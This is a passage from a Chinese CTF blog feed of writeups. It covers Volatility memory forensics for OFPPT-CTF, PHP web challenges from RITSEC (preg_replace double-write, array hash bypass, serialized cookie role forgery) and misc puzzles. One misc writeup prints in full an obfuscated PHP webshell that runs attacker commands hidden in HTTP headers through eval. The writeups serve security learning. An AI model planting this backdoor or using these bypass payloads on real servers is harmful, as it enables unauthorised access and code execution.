dump2</h4><table><thead><tr><th>envars</th><th>显示进程的环境变量</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀bohemian)-[/tools/volatility]</span><br><span class="line">└─# python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 envars | grep COMPUTE</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">     568 wininit.exe          0x000002760e625ed0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     644 winlogon.exe         0x000002a6290b71e0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     668 services.exe         0x0000018faf8027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     708 lsass.exe            0x00000234422027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     832 svchost.exe          0x000001e39d6027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     952 svchost.exe          0x000001c6c2e027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     996 svchost.exe          0x000002da882027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     428 dwm.exe              0x0000019f91800fe0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br></pre></td></tr></table></figure><blockquote><p>OFPPT-CTF{DESKTOP-IT8QNRI}</p></blockquote><h4 id="Windows-memory-dump3"><a href="#Windows-memory-dump3" class="headerlink" title="Windows memory dump3"></a>Windows memory dump3</h4><p>Using the memory dump file from Window memory dump challenge, find out the name of the malicious process.<br>Submit the flag as OFPPT-CTF{process-name_pid} (include the file extension). Example: OFPPT-CTF{svchost.exe_1234}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀bohemian)-[/tools/volatility]</span><br><span class="line">└─# python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 pstree                                                                         130 ⨯</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Name                                                  Pid   PPid   Thds   Hnds Time</span><br><span class="line">-------------------------------------------------- ------ ------ ------ ------ ----</span><br><span class="line"> 0xffff9a077fead080:wininit.exe                       568    456      1      0 2021-09-07 14:24:53 UTC+0000</span><br><span class="line">. 0xffff9a077ff1d080:lsass.exe                        708    568     13      0 2021-09-07 14:24:55 UTC+0000</span><br><span class="line">. 0xffff9a077ff54140:fontdrvhost.ex                   864    568      5      0 2021-09-07 14:24:55 UTC+0000</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"> 0xffff9a07843ab080:userinit.exe                     8180   2252      3      0 2021-09-07 14:55:55 UTC+0000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root💀bohemian)-[/tools/volatility]</span><br><span class="line">└─# python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 cmdline | grep 8180</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">userinit.exe pid:   8180</span><br></pre></td></tr></table></figure><blockquote><p>OFPPT-CTF{userinit.exe_8180}</p></blockquote><h4 id="Windows-memory-dump4"><a href="#Windows-memory-dump4" class="headerlink" title="Windows memory dump4"></a>Windows memory dump4</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root💀bohemian)-[/tools/volatility]</span><br><span class="line">└─<span class="comment"># python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 dumpfiles --pid 8180 --dump-dir=../ctf/ofppt/                                    1 ⨯</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">ImageSectionObject 0xffff9a077f6d01a0   8180   \Device\HarddiskVolume2\Windows\SysWOW64\sechost.dll</span><br><span class="line">DataSectionObject 0xffff9a077f61f0d0   8180   \Device\HarddiskVolume2\Windows\System32\locale.nls</span><br><span class="line">ImageSectionObject 0xffff9a07857d4280   8180   \Device\HarddiskVolume2\Windows\Temp\userinit.exe</span><br><span class="line">ImageSectionObject 0xffff9a0784c4e590   8180   \Device\HarddiskVolume2\Windows\SysWOW64\cryptsp.dll</span><br><span class="line">ImageSectionObject 0xffff9a0784c6fa60   8180   \Device\HarddiskVolume2\Windows\System32\icuin.dll</span><br><span class="line">ImageSectionObject 0xffff9a0784c6f740   8180   \Device\HarddiskVolume2\Windows\System32\icuuc.dll</span><br><span class="line">DataSectionObject 0xffff9a0785d549b0   8180   \Device\HarddiskVolume2\Windows\System32\en-US\WWAHost.exe.mui</span><br><span class="line">DataSectionObject 0xffff9a0785d5ba30   8180   \Device\HarddiskVolume2\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_18.2106.12410.0_x64__8wekyb3d8bbwe\microsoft.system.package.metadata\S-1-5-21-1114333211-2247716564-2192578087-1001-MergedResources-0.pri</span><br><span class="line">DataSectionObject 0xffff9a077fefc730   8180   \Device\HarddiskVolume2\Windows\Globalization\Sorting\SortDefault.nls</span><br><span class="line">DataSectionObject 0xffff9a078480c5f0   8180   \Device\HarddiskVolume2\Windows\System32\en-US\edgehtml.dll.mui</span><br><span class="line">DataSectionObject 0xffff9a0780c1ced0   8180   \Device\HarddiskVolume2\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\~FontCache-System.dat</span><br><span class="line">DataSectionObject 0xffff9a0780d38620   8180   \Device\HarddiskVolume2\Windows\System32\en-US\KernelBase.dll.mui</span><br><span class="line">DataSectionObject 0xffff9a07809f4a30   8180   \Device\HarddiskVolume2\Windows\System32\en-US\dnsapi.dll.mui</span><br><span class="line">DataSectionObject 0xffff9a078482feb0   8180   \Device\HarddiskVolume2\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\~FontCache-S-1-5-21-1114333211-2247716564-2192578087-1001.dat</span><br></pre></td></tr></table></figure><p>ImageSectionObject 0xffff9a07857d4280   8180   \Device\HarddiskVolume2\Windows\Temp\userinit.exe</p><p>未出，借一下大师傅的writeup</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ vol -f physmemraw windows.dumpfiles --pid 8180</span><br><span class="line"></span><br><span class="line">Volatility 3 Framework 2.0.2</span><br><span class="line">Progress:  100.00               PDB scanning finished  </span><br><span class="line">Cache   FileObject      FileName        Result</span><br><span class="line"></span><br><span class="line">ImageSectionObject      0x9a077f6d01a0  sechost.dll     file.0x9a077f6d01a0.0x9a077f0ddb20.ImageSectionObject.sechost.dll.img</span><br><span class="line">ImageSectionObject      0x9a07857d4280  userinit.exe    file.0x9a07857d4280.0x9a07843b6a90.ImageSectionObject.userinit.exe.img</span><br><span class="line">ImageSectionObject      0x9a0784c4e590  cryptsp.dll     file.0x9a0784c4e590.0x9a0784bbca20.ImageSectionObject.cryptsp.dll.img</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">└─$ sha1sum file.0x9a07857d4280.0x9a07843b6a90.ImageSectionObject.userinit.exe.img</span><br><span class="line">962d96f30c8f126cbcdee6eecc5e50c3a408402b  file.0x9a07857d4280.0x9a07843b6a90.ImageSectionObject.userinit.exe.img</span><br></pre></td></tr></table></figure><p>Flag: <code>OFPPT-CTF&#123;962d96f30c8f126cbcdee6eecc5e50c3a408402b&#125;</code></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hash&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;hash&#x27;</span>] === <span class="string">&quot;10932435112&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Not so easy mate.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$hash</span> = sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;hash&#x27;</span>]);</span><br><span class="line">    <span class="variable">$target</span> = sha1(<span class="number">10932435112</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$hash</span> == <span class="variable">$target</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;csictf&#123;loser&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"> ?hash=aaroZmOk</span><br></pre></td></tr></table></figure><blockquote><p>参考<a href="https://hhyleung.github.io/writeups/ofppt-ctf-2022/">https://hhyleung.github.io/writeups/ofppt-ctf-2022/</a></p><blockquote><p>一直在路上</p></blockquote></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> 流量分析 </tag>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022 RITSEC CTF 部分writeup</title>
      <link href="/2022/04/02/CTFS/2022-RITSEC-CTF-%E9%83%A8%E5%88%86writeup/"/>
      <url>/2022/04/02/CTFS/2022-RITSEC-CTF-%E9%83%A8%E5%88%86writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h3 id="Pretty-Horrible-Program-1"><a href="#Pretty-Horrible-Program-1" class="headerlink" title="Pretty Horrible Program 1"></a>Pretty Horrible Program 1</h3><p>考点：双写绕过preg_replace</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>];</span><br><span class="line">    <span class="variable">$to_replace</span> = <span class="string">&#x27;bingus&#x27;</span>;</span><br><span class="line">    <span class="variable">$clean_string</span> = preg_replace(<span class="string">&quot;/<span class="subst">$to_replace</span>/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your string is: <span class="subst">$clean_string</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$clean_string</span> == <span class="variable">$to_replace</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h2 class=\&quot;answer\&quot;&gt;Bingus &lt;span style=\&quot;color: green;\&quot;&gt;IS&lt;/span&gt; your beloved&lt;/h2&gt;&quot;</span>;</span><br><span class="line">      output_flag();</span><br></pre></td></tr></table></figure><p>$clean_string = preg_replace(“/$to_replace/“, ‘’, $input);<br>关键代码，get传参一个bingus，由于preg_replace会把一个bingus替换为空，但是下面又要等于bingus，我们可以双写<code>bingbingusus</code><br><img src="/images/2022-RITSEC-CTF/1.png" alt="image-20220402162035760"></p><h3 id="Pretty-Horrible-Program-3"><a href="#Pretty-Horrible-Program-3" class="headerlink" title="Pretty Horrible Program 3"></a>Pretty Horrible Program 3</h3><p>考点：hash强碰撞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input1&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;input1&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;input2&#x27;</span>]) &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&#x27;&lt;h3 class=&quot;error&quot;&gt;Nice try, but it won\&#x27;t be that easy ;)&lt;/h3&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (hash(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;input1&#x27;</span>]) === hash(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;input2&#x27;</span>])) &#123;</span><br><span class="line">      output_flag();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&#x27;&lt;h3 class=&quot;error&quot;&gt;Your inputs don\&#x27;t match&lt;/h3&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里我们需要输入input1和input2，并且1与2不能相同，但是他们的sha256要相同可以这样绕过<br><code>input1[]=1&amp;input2[]=2</code></p><p><img src="/images/2022-RITSEC-CTF/2.png" alt="image-20220402164521180"></p><h3 id="Pretty-Horrible-Program-2"><a href="#Pretty-Horrible-Program-2" class="headerlink" title="Pretty Horrible Program 2"></a>Pretty Horrible Program 2</h3><p>考点：简单php反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//public $role = &#x27;User&#x27;;</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$role</span>=<span class="string">&quot;Admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function is_admin()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//   if ($this-&gt;role == &#x27;Admin&#x27;) &#123;</span></span><br><span class="line">    <span class="comment">//     return true;</span></span><br><span class="line">    <span class="comment">//   &#125; else &#123;</span></span><br><span class="line">    <span class="comment">//     return false;</span></span><br><span class="line">    <span class="comment">//   &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __sleep()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//   return array($this-&gt;role);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$c</span> = serialize(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;<span class="comment">//O:4:&quot;User&quot;:1:&#123;s:4:&quot;role&quot;;s:5:&quot;Admin&quot;;&#125;</span></span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里cookie 的role必须要是admin,所以我们把User换成admin，其他注释掉，输出就可以了<br>由于我们这里是post 和 cookie提交 ，要注意编码问题，我们这里直接urlencode，提交就可以了</p><p><img src="/images/2022-RITSEC-CTF/3.png" alt="image-20220402181841597"></p><h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><blockquote><p>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> hash碰撞 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022hwsgogogo</title>
      <link href="/2022/01/26/CTFS/2022hwsgogogo/"/>
      <url>/2022/01/26/CTFS/2022hwsgogogo/</url>
      
        <content type="html"><![CDATA[<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h5><p>考点：拼图+取证+Aztec 码<br>下载下来压缩包有两个附件，分别解压一下，一个是有许多图片，一个是一个raw文件，显然是取证了。<br>先看这个有许多小图片的压缩包，显然拼图了，总共256张图片，是16<em>16的图片，是160</em>100的小图片<br><strong><img src="/images/hws2022/1.png" alt="image-20220126202221239"></strong><br>直接<code>montage *png -tile 16x16 -geometry 160x100+0+0 out.png</code>合成一个大图片<br>这边用gaps拼了几次没出，果断把out.png改一下大小，大图室 2560<em>1600的，我们改成正正方形，1600</em>1600<br><img src="/images/hws2022/2.png" alt="image-20220126202810888"><br><code>gaps --image=out2.png --generations=15 --population=256 --size=100 --verbose</code><br>在拼一下就出来了，注意参数<br><img src="/images/hws2022/3.png" alt="image-20220126203016856"><br>flag关键字没有，搜一个zip，桌面上有csgo.zip<br><code> python vol.py -f 2.raw --profile=WinXPSP2x86 filescan | grep flag</code><br><code> python vol.py -f 2.raw --profile=WinXPSP2x86 filescan | grep zip</code><br><img src="/images/hws2022/4.png" alt="image-20220126203415648"><br><code>python vol.py -f 2.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002182dc0 -D ./dasctf -u</code><br>提一下，有密码,用刚刚的密码解压，里面是两个图片，第一个图片室csgo图片，第二个是一个码中间缺了定位符，用谷歌搜一下，是Aztec，在线网站<code>https://products.aspose.app/barcode/zh-hans/generate</code>，先生成一个aztec，把中间的定位符扣下来，然后贴上去，扫码就可以了。<br><img src="/images/hws2022/5.png" alt="image-2022012620341548"><br><img src="/images/hws2022/6.png" alt="image-20220126204727776"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote><p>一直在路上</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> hws2022 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D.I.E&amp;Trinity CTF部分wp</title>
      <link href="/2022/01/24/D-I-E-Trinity-CTF%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/01/24/D-I-E-Trinity-CTF%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/tjuctf/index.png" alt="image-20220124192143500"><br>emmm 天津大学和南京大学的招新赛，题目还是很有质量的，tcl了，有些题还是不会<br>记一下吧</p><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h5><p>下载一个附件，file看一下，发现是data，不管了 ，直接foremost分离一下<br><code>foremost data</code><br>有两个图片一个jpg，一个png两个图片是一样的，盲猜<code>盲水印</code><br>项目下载<code>https://github.com/chishaxie/BlindWaterMark</code><br>直接<code>python3 bwmforpy3.py decode 00001537.png 00001404.jpg a.png</code><br><img src="/images/tjuctf/1.png" alt="image-20220124194256825">发现，图片不太清楚，问了下出题人，有alpha值，研究一下脚本<br><img src="/images/tjuctf/2.png" alt="image-20220124194320886"><br>看到 <code>--alpha &lt;float&gt;,  Manual setting alpha (default is 3.0)</code><br>默认值为三，我们调到5<code> python3 bwmforpy3.py decode 00001537.png 00001404.jpg a.png --alpha 5</code><br>还是不清楚，加到10  <code>python3 bwmforpy3.py decode 00001537.png 00001404.jpg a.png --alpha 10</code><br><img src="/images/tjuctf/3.png" alt="image-20220124194614378"></p><h5 id="ezdecode"><a href="#ezdecode" class="headerlink" title="ezdecode"></a>ezdecode</h5><p>签到题，是各种编码的组合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">编码1：You Know That</span><br><span class="line">ZmxhZ3t3M2xjMG1f   --&gt;base64</span><br><span class="line">flag&#123;w3lc0m_7o_amaz1n9_CTF_vv0RId_!&#125;</span><br><span class="line">编码2：Key == 2</span><br><span class="line">7_mznoaa19    --&gt;栅栏   key为为2</span><br><span class="line">编码3：Play With Bubble</span><br><span class="line">xilog-fahig-kalal-kytef-begig-nanyh-zumal-tuxox   --&gt;气泡</span><br><span class="line">`http://www.hiencode.com/bubble.html`</span><br><span class="line">_CTF_vv0RId_!&#125;</span><br></pre></td></tr></table></figure><h5 id="这里有后门！"><a href="#这里有后门！" class="headerlink" title="这里有后门！"></a>这里有后门！</h5><p>个人认为这个题还是非常有趣的，里面涉及的加密方法还没搞懂，写一下做题记录吧<br>拿到附件，题目已经说了，是后门，看了一下,显然是经过混淆加密的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span>=<span class="string">&#x27;S+)$p.iS=$iSq[$m[2][$z]iS]iSiS;if(strpos(iS$p,$h)===0iS)&#123;$s[$iiS]=iS&quot;&quot;;$iSpiS=$ss($p,3);&#125;if(arriSiSay&#x27;</span>;</span><br><span class="line"><span class="variable">$H</span>=<span class="string">&#x27;s=&amp;iS$_SESSiSION;$ss=&quot;subsiSiStr&quot;;$sliS=&quot;stiSrtolower&quot;;$i=$miS[1][iS0].iS$m[iS1][iS1];$h=$sl($ss(md5iS&#x27;</span>;</span><br><span class="line"><span class="variable">$X</span>=<span class="string">&#x27;($i.iS$kh),0,iS3)iS);$f=$sl(iS$ssiS(iSmd5($i.$kf),iS0iS,iS3));$p=&quot;&quot;;foriS($z=1;$z&lt;couiSiSnt($m[1]);$z+i&#x27;</span>;</span><br><span class="line"><span class="variable">$L</span>=str_replace(<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crexxatex_fxxunxction&#x27;</span>);</span><br><span class="line"><span class="variable">$E</span>=<span class="string">&#x27;;$i&lt;$l;)&#123;foriS($j=0;(iS$j&lt;$ciS&amp;&amp;iS$i&lt;$l);$jiSiS++,iS$i++)&#123;$o.=$t&#123;$iiS&#125;^$k&#123;$j&#125;iS;iS&#125;iS&#125;riSeturn $o;&#125;$iSr=iSiS$&#x27;</span>;</span><br><span class="line"><span class="variable">$Q</span>=<span class="string">&#x27;=basiSiSe64_encode(x(giSzcompress($o)iS,$k)iS);print(&quot;iS&lt;$k&gt;iS$d&lt;/iS$k&gt;&quot;);@siSessioniS_destroyiS();&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>=<span class="string">&#x27;_SiSERViSEiSR;iS$rr=@$r[&quot;HTTiSP_REFEiSRER&quot;iS];$ra=@$r[iS&quot;iSHTTP_ACCEiSPT_LANGiSUAGE&quot;]iS;ifiS($rr&amp;&amp;$iSra)&#123;$&#x27;</span>;</span><br><span class="line"><span class="variable">$l</span>=<span class="string">&#x27;iS$kiSh=&quot;3481&quot;iS;iS$kf=&quot;iS9diS7b&quot;;funiSctiSion x($t,$k)&#123;$c=strliSen($kiS);iSiS$l=strlen($tiS);$o=&quot;&quot;;foiSr(iS$i=0iS&#x27;</span>;</span><br><span class="line"><span class="variable">$h</span>=<span class="string">&#x27;ll(iS&quot;/([\\w])iS[\\w-]+(iS?:;q=0.iS([iSiS\\d]))?,?/&quot;,iS$riSa,iS$miS);if($q&amp;&amp;$m)&#123;@siSession_staiSrtiS(iS);$&#x27;</span>;</span><br><span class="line"><span class="variable">$Z</span>=<span class="string">&#x27;art();@evaiSl(@giSzuniSiSciSompress(@x(@baseiS64_decodeiS(pregiS_riSeplace(ariSray(&quot;/_/&quot;,&quot;/-/iS&quot;),arriSa&#x27;</span>;</span><br><span class="line"><span class="variable">$W</span>=<span class="string">&#x27;_key_exiSists(iS$i,$s))&#123;iS$siS[$i].=$piS;$e=iSiSstrpos($siS[$iiS]iS,$f);if($e)&#123;$k=$kh.$kiSf;ob_stiSiS&#x27;</span>;</span><br><span class="line"><span class="variable">$g</span>=<span class="string">&#x27;u=paiSrse_iSiSurl($rr);pariSse_siStr($u[&quot;queriSy&quot;],$iSq)iS;iSiS$q=array_iSvaluiSes($q);pregiS_match_a&#x27;</span>;</span><br><span class="line"><span class="variable">$D</span>=<span class="string">&#x27;y(iS&quot;/&quot;,iS&quot;iS+&quot;)iS,$ss($s[$i],iS0,$e)iS)),$k)))iS;$o=obiS_get_iSiScontents()iS;ob_eniSd_iScleaiSn();$d&#x27;</span>;</span><br><span class="line"><span class="variable">$O</span>=str_replace(<span class="string">&#x27;iS&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$l</span>.<span class="variable">$E</span>.<span class="variable">$p</span>.<span class="variable">$g</span>.<span class="variable">$h</span>.<span class="variable">$H</span>.<span class="variable">$X</span>.<span class="variable">$u</span>.<span class="variable">$W</span>.<span class="variable">$Z</span>.<span class="variable">$D</span>.<span class="variable">$Q</span>);</span><br><span class="line"><span class="variable">$q</span>=<span class="variable">$L</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$O</span>);<span class="variable">$q</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>google一下关键代码，直接出了一个解密网站<code>https://www.unphp.net/</code>把代码拿到这个网站解一下<br><img src="/images/tjuctf/4.png" alt="image-20220124195541546"><br>后面，搜到这个马子知道居然还可以直接输出<br><img src="/images/tjuctf/5.png" alt="image-20220124195909580"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 